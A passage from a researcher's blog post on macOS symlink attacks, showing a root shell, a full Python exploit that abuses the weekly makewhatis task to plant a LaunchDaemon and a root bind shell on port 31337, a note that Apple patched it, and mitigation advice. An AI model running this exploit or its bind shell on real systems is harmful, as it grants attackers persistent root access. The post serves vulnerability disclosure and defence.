</span></span><span style="display:flex;"><span><span style="color:#033">uid</span><span style="color:#555">=</span>0<span style="color:#555">(</span>root<span style="color:#555">)</span> <span style="color:#033">gid</span><span style="color:#555">=</span>0<span style="color:#555">(</span>wheel<span style="color:#555">)</span> <span style="color:#033">groups</span><span style="color:#555">=</span>0<span style="color:#555">(</span>wheel<span style="color:#555">)</span>,1<span style="color:#555">(</span>daemon<span style="color:#555">)</span>,2<span style="color:#555">(</span>kmem<span style="color:#555">)</span>,3<span style="color:#555">(</span>sys<span style="color:#555">)</span>,4<span style="color:#555">(</span>tty<span style="color:#555">)</span>,5<span style="color:#555">(</span>operator<span style="color:#555">)</span>,8<span style="color:#555">(</span>procview<span style="color:#555">)</span>,9<span style="color:#555">(</span>procmod<span style="color:#555">)</span>,12<span style="color:#555">(</span>everyone<span style="color:#555">)</span>,20<span style="color:#555">(</span>staff<span style="color:#555">)</span>,29<span style="color:#555">(</span>certusers<span style="color:#555">)</span>,61<span style="color:#555">(</span>localaccounts<span style="color:#555">)</span>,80<span style="color:#555">(</span>admin<span style="color:#555">)</span>,702<span style="color:#555">(</span>com.apple.sharepoint.group.3<span style="color:#555">)</span>,703<span style="color:#555">(</span>com.apple.sharepoint.group.2<span style="color:#555">)</span>,33<span style="color:#555">(</span>_appstore<span style="color:#555">)</span>,98<span style="color:#555">(</span>_lpadmin<span style="color:#555">)</span>,100<span style="color:#555">(</span>_lpoperator<span style="color:#555">)</span>,204<span style="color:#555">(</span>_developer<span style="color:#555">)</span>,250<span style="color:#555">(</span>_analyticsusers<span style="color:#555">)</span>,395<span style="color:#555">(</span>com.apple.access_ftp<span style="color:#555">)</span>,398<span style="color:#555">(</span>com.apple.access_screensharing<span style="color:#555">)</span>,399<span style="color:#555">(</span>com.apple.access_ssh<span style="color:#555">)</span>,701<span style="color:#555">(</span>com.apple.sharepoint.group.1<span style="color:#555">)</span>
</span></span><span style="display:flex;"><span>bash-3.2# <span style="color:#366">exit</span>
</span></span><span style="display:flex;"><span><span style="color:#366">exit</span>
</span></span></code></pre></div><p>I made a Python script to do all the tasks mentioned above:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">sys</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">os</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>man_file_content <span style="color:#555">=</span> <span style="color:#c30">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">.TH exploit 1 &#34;August 16 2019&#34; &#34;Csaba Fitzl&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">.SH NAME
</span></span></span><span style="display:flex;"><span><span style="color:#c30">exploit \- --&gt; &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE plist PUBLIC &#34;-//Apple Computer//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;&lt;plist version=&#34;1.0&#34;&gt;&lt;dict&gt;&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;com.sample.Load&lt;/string&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt; &lt;string&gt;/Applications/Scripts/sample.sh&lt;/string&gt;&lt;/array&gt;&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;&lt;/dict&gt;&lt;/plist&gt;&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sh_quick_content <span style="color:#555">=</span> <span style="color:#c30">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sh_reboot_content <span style="color:#555">=</span> <span style="color:#c30">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">python /Applications/Scripts/bind.py
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>python_bind_content <span style="color:#555">=</span> <span style="color:#c30">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">#!/usr/bin/python2
</span></span></span><span style="display:flex;"><span><span style="color:#c30">import os
</span></span></span><span style="display:flex;"><span><span style="color:#c30">import pty
</span></span></span><span style="display:flex;"><span><span style="color:#c30">import socket
</span></span></span><span style="display:flex;"><span><span style="color:#c30">
</span></span></span><span style="display:flex;"><span><span style="color:#c30">lport = 31337
</span></span></span><span style="display:flex;"><span><span style="color:#c30">
</span></span></span><span style="display:flex;"><span><span style="color:#c30">def main():
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    s.bind((&#39;&#39;, lport))
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    s.listen(1)
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    (rem, addr) = s.accept()
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    os.dup2(rem.fileno(),0)
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    os.dup2(rem.fileno(),1)
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    os.dup2(rem.fileno(),2)
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    os.putenv(&#34;HISTFILE&#34;,&#39;/dev/null&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    pty.spawn(&#34;/bin/bash&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    s.close()
</span></span></span><span style="display:flex;"><span><span style="color:#c30">	
</span></span></span><span style="display:flex;"><span><span style="color:#c30">if __name__ == &#34;__main__&#34;:
</span></span></span><span style="display:flex;"><span><span style="color:#c30">    main()
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create_man_file</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#366">print</span>(<span style="color:#c30">&#34;[i] Creating bogus man page: /usr/local/share/man/man1/&lt;!--exploit.1&#34;</span>)	
</span></span><span style="display:flex;"><span>	f <span style="color:#555">=</span> <span style="color:#366">open</span>(<span style="color:#c30">&#39;/usr/local/share/man/man1/&lt;!--exploit.1&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>	f<span style="color:#555">.</span>write(man_file_content)
</span></span><span style="display:flex;"><span>	f<span style="color:#555">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create_symlink</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#366">print</span>(<span style="color:#c30">&#34;[i] Creating symlink in /usr/local/share/man/&#34;</span>)
</span></span><span style="display:flex;"><span>	os<span style="color:#555">.</span>system(<span style="color:#c30">&#39;ln -s /Library/LaunchDaemons/com.sample.Load.plist /usr/local/share/man/whatis.tmp&#39;</span>)	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create_scripts_dir</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#366">print</span>(<span style="color:#c30">&#34;[i] Creating /Applications/Scripts directory&#34;</span>)
</span></span><span style="display:flex;"><span>	os<span style="color:#555">.</span>system(<span style="color:#c30">&#39;mkdir /Applications/Scripts&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create_quick_scripts</span>():
</span></span><span style="display:flex;"><span>	create_scripts_dir()
</span></span><span style="display:flex;"><span>	<span style="color:#366">print</span>(<span style="color:#c30">&#34;[i] Creating script file to be called by LaunchDaemon&#34;</span>)
</span></span><span style="display:flex;"><span>	f <span style="color:#555">=</span> <span style="color:#366">open</span>(<span style="color:#c30">&#39;/Applications/Scripts/sample.sh&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>	f<span style="color:#555">.</span>write(sh_quick_content)
</span></span><span style="display:flex;"><span>	f<span style="color:#555">.</span>close()
</span></span><span style="display:flex;"><span>	os<span style="color:#555">.</span>system(<span style="color:#c30">&#39;chmod +x /Applications/Scripts/sample.sh&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create_reboot_scripts</span>():
</span></span><span style="display:flex;"><span>	create_scripts_dir()
</span></span><span style="display:flex;"><span>	<span style="color:#366">print</span>(<span style="color:#c30">&#34;[i] Creating script file to be called by LaunchDaemon&#34;</span>)
</span></span><span style="display:flex;"><span>	f <span style="color:#555">=</span> <span style="color:#366">open</span>(<span style="color:#c30">&#39;/Applications/Scripts/sample.sh&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>	f<span style="color:#555">.</span>write(sh_reboot_content)
</span></span><span style="display:flex;"><span>	f<span style="color:#555">.</span>close()
</span></span><span style="display:flex;"><span>	os<span style="color:#555">.</span>system(<span style="color:#c30">&#39;chmod +x /Applications/Scripts/sample.sh&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#366">print</span>(<span style="color:#c30">&#34;[i] Creating python script for bind shell&#34;</span>)
</span></span><span style="display:flex;"><span>	f <span style="color:#555">=</span> <span style="color:#366">open</span>(<span style="color:#c30">&#39;/Applications/Scripts/bind.py&#39;</span>,<span style="color:#c30">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>	f<span style="color:#555">.</span>write(python_bind_content)
</span></span><span style="display:flex;"><span>	f<span style="color:#555">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rename_man_pages</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span> root, dirs, files <span style="color:#000;font-weight:bold">in</span> os<span style="color:#555">.</span>walk(<span style="color:#c30">&#34;/usr/local/share/man&#34;</span>):
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">for</span> file <span style="color:#000;font-weight:bold">in</span> files:
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> file[<span style="color:#f60">0</span>] <span style="color:#000;font-weight:bold">in</span> <span style="color:#c30">&#34;0123456789&#34;</span>: <span style="color:#09f;font-style:italic">#if filename begins with a number</span>
</span></span><span style="display:flex;"><span>				old_file <span style="color:#555">=</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(root, file)
</span></span><span style="display:flex;"><span>				new_file <span style="color:#555">=</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(root, <span style="color:#c30">&#39;a&#39;</span> <span style="color:#555">+</span> file)
</span></span><span style="display:flex;"><span>				os<span style="color:#555">.</span>rename(old_file, new_file) <span style="color:#09f;font-style:italic">#rename with adding a prefix</span>
</span></span><span style="display:flex;"><span>				<span style="color:#366">print</span>(<span style="color:#c30">&#34;[i] Renaming: &#34;</span> <span style="color:#555">+</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(root, file))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">main</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> <span style="color:#366">len</span>(sys<span style="color:#555">.</span>argv) <span style="color:#555">!=</span> <span style="color:#f60">2</span> :
</span></span><span style="display:flex;"><span>		<span style="color:#366">print</span> <span style="color:#c30">&#34;[-] Usage: python makewhatis_exploit.py [quick|reboot]&#34;</span>
</span></span><span style="display:flex;"><span>		sys<span style="color:#555">.</span>exit (<span style="color:#f60">1</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> sys<span style="color:#555">.</span>argv[<span style="color:#f60">1</span>] <span style="color:#555">==</span> <span style="color:#c30">&#39;quick&#39;</span>:
</span></span><span style="display:flex;"><span>		create_man_file()
</span></span><span style="display:flex;"><span>		create_symlink()
</span></span><span style="display:flex;"><span>		create_quick_scripts()
</span></span><span style="display:flex;"><span>		rename_man_pages()
</span></span><span style="display:flex;"><span>		<span style="color:#366">print</span> <span style="color:#c30">&#34;[+] Everything is set, run periodic tasks with:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">sudo periodic weekly</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">[i] and then simulate a boot load with: </span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">sudo launchctl load com.sample.Load.plist&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">elif</span> sys<span style="color:#555">.</span>argv[<span style="color:#f60">1</span>] <span style="color:#555">==</span> <span style="color:#c30">&#39;reboot&#39;</span>:
</span></span><span style="display:flex;"><span>		create_man_file()
</span></span><span style="display:flex;"><span>		create_symlink()
</span></span><span style="display:flex;"><span>		create_reboot_scripts()
</span></span><span style="display:flex;"><span>		rename_man_pages()
</span></span><span style="display:flex;"><span>		<span style="color:#366">print</span> <span style="color:#c30">&#34;[+] Everything is set, run periodic tasks with:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">sudo periodic weekly</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">[i] reboot macOS and connect to your root shell via:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">nc 127.1 31337&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#366">print</span> <span style="color:#c30">&#34;[-] Invalid arguments&#34;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#366">print</span> <span style="color:#c30">&#34;[-] Usage: python makewhatis_exploit.py [quick|reboot]&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> __name__<span style="color:#555">==</span> <span style="color:#c30">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>	main()
</span></span></code></pre></div><p>The command line argument has to be set:</p>
<ol>
<li>quick - this will create a shell script which starts Terminal in case you don’t want to reboot the system for testing</li>
<li>reboot - this is the proper method to fully test the exploit, it will create the bind shell in this case, and you will need to reboot to get a shell</li>
</ol>
<p>This was fixed in Catalina 10.15.1: <a href="https://support.apple.com/en-us/HT210722"  class="external-link" target="_blank" rel="noopener">About the security content of macOS Catalina 10.15.1, Security Update 2019-001, and Security Update 2019-006 - Apple Support</a></p>
<h2 id="how-to-avoid-these-issues">
  How to avoid these issues?
  <a class="heading-link" href="#how-to-avoid-these-issues">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Overall the best if the directory and the file permissions are aligned. Files in a given directory should follow the ownership and rights of the directory, in the cases we saw here, it would involve that processes running as <code>root</code> shouldn&rsquo;t touch files in directories where the owner is someone else. If you really have to do that, you should protect the file with the <code>uchg</code> flag, so no one, beside a root could modify it. Although there would be still a race condition as for changing the file, the flag has to be lifted up, and then someone could change it.</p>
<h3 id="installers">
  Installers
  <a class="heading-link" href="#installers">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>In case of installers using the <code>/tmp/</code> directory, a randomly generated directory should be created, so someone wouldn&rsquo;t have the ability to predict that name, and thus pre-create anything there for abuse. If that&rsquo;s not the case a process like this could be applied:</p>
<ol>
<li>Check if folder owner is <code>root</code> and remove all permissions for others and group users</li>
<li>Clean all contents under folder in before any files being copied there</li>
</ol>
<h3 id="when-symlinks-are-not-followed">
  When Symlinks are not followed?
  <a class="heading-link" href="#when-symlinks-are-not-followed">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>In case of file moves symlinks or hard links won&rsquo;t be followed, take a look at the below experiment:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#366">echo</span> aaa &gt; a
</span></span><span style="display:flex;"><span>$ ln -s a b
</span></span><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">4</span> csaby  staff   <span style="color:#f60">128</span> Sep <span style="color:#f60">11</span> 16:16 .
</span></span><span style="display:flex;"><span>drwxr-xr-x+ <span style="color:#f60">50</span> csaby  staff  <span style="color:#f60">1600</span> Sep <span style="color:#f60">11</span> 16:16 ..
</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#f60">1</span> csaby  staff     <span style="color:#f60">4</span> Sep <span style="color:#f60">11</span> 16:16 a
</span></span><span style="display:flex;"><span>lrwxr-xr-x   <span style="color:#f60">1</span> csaby  staff     <span style="color:#f60">1</span> Sep <span style="color:#f60">11</span> 16:16 b -&gt; a
</span></span><span style="display:flex;"><span>$ cat b
</span></span><span style="display:flex;"><span>aaa
</span></span><span style="display:flex;"><span>$ <span style="color:#366">echo</span> bbb &gt;&gt; b
</span></span><span style="display:flex;"><span>$ cat b
</span></span><span style="display:flex;"><span>aaa
</span></span><span style="display:flex;"><span>bbb
</span></span><span style="display:flex;"><span>$ touch c
</span></span><span style="display:flex;"><span>$ ls -l
</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">8</span> Sep <span style="color:#f60">11</span> 16:16 a
</span></span><span style="display:flex;"><span>lrwxr-xr-x  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">1</span> Sep <span style="color:#f60">11</span> 16:16 b -&gt; a
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">0</span> Sep <span style="color:#f60">11</span> 16:25 c
</span></span><span style="display:flex;"><span>$ mv c b
</span></span><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">4</span> csaby  staff   <span style="color:#f60">128</span> Sep <span style="color:#f60">11</span> 16:25 .
</span></span><span style="display:flex;"><span>drwxr-xr-x+ <span style="color:#f60">50</span> csaby  staff  <span style="color:#f60">1600</span> Sep <span style="color:#f60">11</span> 16:16 ..
</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#f60">1</span> csaby  staff     <span style="color:#f60">8</span> Sep <span style="color:#f60">11</span> 16:16 a
</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#f60">1</span> csaby  staff     <span style="color:#f60">0</span> Sep <span style="color:#f60">11</span> 16:25 b
</span></span></code></pre></div><p>Even if we create a hardlink instead of symlink, that will be overwritten like in the 1st case. Basically when you move a file X to location Y, if Y is a *link it will be overwritten.</p>
<p>For Objective-C objects, the <code>writeToFile</code> method will not follow symlink, so it&rsquo;s safe to use. Take this example:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>NSError <span style="color:#555">*</span>error;
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">BOOL</span> succeed <span style="color:#555">=</span> [<span style="color:#c30">@&#34;testing&#34;</span> <span style="color:#99f">writeToFile</span>:<span style="color:#c30">@&#34;myfile.txt&#34;</span> <span style="color:#99f">atomically</span>:<span style="color:#366">YES</span> <span style="color:#99f">encoding</span>:NSUTF8StringEncoding <span style="color:#99f">error</span>:<span style="color:#555">&amp;</span>error];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Even if you create a symlink named <code>myfile.txt</code> pointing somewhere, it will be overwritten.</p>
<h2 id="the-end">
  The End
  <a class="heading-link" href="#the-end">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>This has been a really long post, and I hope it gave you some ideas how to perform symlink or hardlink based attacks on macOS platforms, as well as I could serve with some ideas around impacting file contents.</p>

      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
    2024
     Csaba Fitzl 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://theevilbit.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
